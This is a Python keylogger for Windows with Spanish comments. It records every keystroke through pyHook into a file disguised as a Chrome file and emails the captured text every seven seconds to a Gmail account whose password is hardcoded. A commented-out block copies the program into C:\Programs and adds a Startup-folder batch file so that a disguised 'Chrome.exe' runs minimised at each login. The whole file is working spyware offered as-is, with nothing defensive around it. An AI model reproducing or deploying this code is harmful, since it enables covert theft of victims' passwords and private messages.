import pyHook, pythoncom, sys, logging, time, datetime
from sys import argv
import subprocess
import os

carpeta_destino= 'C:\\Programs\\Chrome.txt'

segundos_espera= 7
timeout= time.time()+ segundos_espera

def TimeOut():
    if time.time() > timeout:
        return True
    else:
        return False

def EnviarEmail():
    with open (carpeta_destino, 'r+') as f:
        fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data=f.read()
        data= data.replace('Space', ' ')
        data = data.replace('\n', '')
        data = 'Mensaje capturado a las: '+ fecha + '\n' + data
        print (data)
        crearEmail('pepitobuscapina@gmail.com', 'Pepito123!', 'pepitobuscapina@gmail.com', 'Nueva captura:' +fecha, data)
        f.seek(0)
        f.truncate()

def crearEmail(user, passw, recep,subj, body):
    import smtplib
    mailUser=user
    mailPass=passw
    From = user
    To = recep
    Subject= subj
    Txt=body

    email = """\From: %s\nTo: %s\nSubject: %s\n\n%s """ % (From, ", ".join(To), Subject, Txt)

    try:
        server=smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(mailUser, mailPass)
        server.sendmail(From, To, email)
        server.close()
        print('Correo enviado con exito!!')

    except:
        print('Correo fallido :(')

def OnKeyboardEvent(event):
    logging.basicConfig(filename=carpeta_destino, level=logging.DEBUG, format='%(message)s')
    print('WindowName:', event.WindowName)
    print('Window:', event.Window)
    print('Key:', event.Key)
    logging.log(10, event.Key)
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown= OnKeyboardEvent
hooks_manager.HookKeyboard()

while True: 
    if TimeOut():
        EnviarEmail()
        timeout= time.time()+ segundos_espera
        
    pythoncom.PumpWaitingMessages()
'''

----- REPLICA EL ARCHIVO .EXE EN C:PROGRAMS
script = argv
name = str(script[0])
directorio= 'C:\\Programs'

subprocess.call(['mkdir',directorio])
subprocess.call(['cp',name,directorio])

------ ESTO NO VA, PERO CREA EL ARCHIVO BAT, NO ENCONTRE FORMA DE METERLO ASI Q LO HICE EN UN PY APARTE

archi1= open('C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\Chrome.bat',"w") 
archi1.write("@echo off \n") 
archi1.write("cd C:\Programs\Chrome\n") 
archi1.write("start /MIN Chrome.exe\n")  
archi1.close() 
'''